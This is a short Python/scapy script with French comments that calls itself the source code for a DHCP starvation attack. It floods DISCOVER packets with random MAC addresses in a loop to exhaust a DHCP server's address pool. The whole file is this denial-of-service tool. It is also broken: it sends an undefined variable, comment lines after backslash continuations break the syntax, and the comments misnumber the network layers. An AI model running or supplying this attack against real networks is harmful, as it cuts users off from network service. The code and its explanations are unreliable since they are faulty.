#!/usr/bin/python3
'''Code source pour l'attaque DHCP Starvation'''
#Importation de toutes les fonctionnalités de la bibliothèque scapy
from scapy.all import *
#Construction d'un paquet DHCP_DISCOVER à envoyer
#Construction de la couche L1 Ethernet avec une adresse MAC de destination de multidiffusion et une adresse MAC source aléatoire avec la fonction "RandMAC" afin d'empêcher le serveur DHCP de déterminer l'expéditeur
frame_discover = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC(), type=0x0800) \
#Construction de la couche L2 IP avec une adresse source par défaut et une adresse destination 255.255.255.255
                / IP(src="0.0.0.0", dst="255.255.255.255") \
#Construction de la couche L3 UDP avec
                / UDP(dport=67,sport=68) \
                / BOOTP(op=1, chaddr=RandMAC()) \
                / DHCP(options=[("message-type","discover"), ("end")]) \

sendp(DHCP_DISCOVER, iface="eth0",loop=1,verbose=1 )
